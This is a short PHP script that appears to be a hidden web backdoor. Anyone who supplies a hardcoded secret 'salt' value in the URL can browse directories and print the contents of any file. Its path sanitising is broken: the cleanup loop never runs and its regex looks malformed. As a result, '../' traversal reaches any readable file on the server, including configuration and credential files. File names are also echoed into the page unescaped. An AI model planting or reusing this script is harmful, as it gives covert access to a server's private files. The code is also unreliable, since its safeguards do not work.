<?php
if ($_GET['salt'] != 'WtsMVFHjj53PmE07') die;
$cd = $_GET['cd'];
$cd = str_replace('/./', '/', $cd);
$cd = preg_replace('%/$%', '', $cd);
$len = strlen($cd);
while ($len !== strlen($cd)) {
  $len = strlen($cd);
  $cd = preg_replace('%[^/\]+/..(/|$)%', '', $cd);
}
$path = realpath(__DIR__.'/'.$cd);
if (!file_exists($path)) {
  echo "not exists";
  die;
}

if (is_dir($path)) echo join("<br>",
  array_map(
    function ($file) use ($cd) {
      return "<a href=\""
      .$_SERVER['SCRIPT_NAME']
      ."?cd=$cd/$file&salt="
      .$_GET['salt']
      ."\">$file</a>";
    },
    scandir($path)
  )
);
else echo file_get_contents($path);
die;
